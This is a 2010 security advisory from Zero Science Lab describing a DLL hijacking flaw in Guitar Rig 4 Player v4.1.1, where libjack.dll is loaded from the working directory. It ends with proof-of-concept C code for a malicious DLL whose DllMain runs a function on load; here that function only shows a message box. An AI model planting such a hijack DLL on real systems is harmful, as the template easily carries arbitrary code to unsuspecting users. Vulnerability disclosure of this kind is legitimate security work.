/*

 Native Instruments Guitar Rig 4 Player v4.1.1 Insecure Library Loading Vulnerability


 Vendor: Native Instruments GmbH
 Product web page: http://www.native-instruments.com
 Affected version: 4.1.1.1845 (Standalone)

 Summary: GUITAR RIG 4 PLAYER is the free, modular and expandable effects processor
 from Native Instruments, combining creative effects routing possibilities with
 ease-of-use and pristine sound quality. The included FACTORY SELECTION library
 provides one stunning Amp emulation with Matched Cabinet, plus 20 effects and sound
 modifiers to shape and enhance any audio signal.

 Desc: Guitar Rig 4 Player suffers from a DLL hijacking vulnerability, which could be
 exploited by remote attackers to compromise a vulnerable system. This issue is
 caused due to the application insecurely loading certain libraries ("libjack.dll")
 from the current working directory, which could allow attackers to execute arbitrary
 code by tricking a user into opening specific related files (.nkm and .nkp) from a
 network share.

 Tested on: Microsoft Windows XP Professional SP3 (English)

 Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
 liquidworm gmail com

 Zero Science Lab - http://www.zeroscience.mk

 Advisory ID: ZSL-2010-4973
 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4973.php

 06.11.2010

*/


#include <windows.h>

BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{

        switch (fdwReason)
        {
                case DLL_PROCESS_ATTACH:
                dll_mll();
                case DLL_THREAD_ATTACH:
                case DLL_THREAD_DETACH:
                case DLL_PROCESS_DETACH:
                break;
        }

        return TRUE;
}

int dll_mll()
{
        MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
}


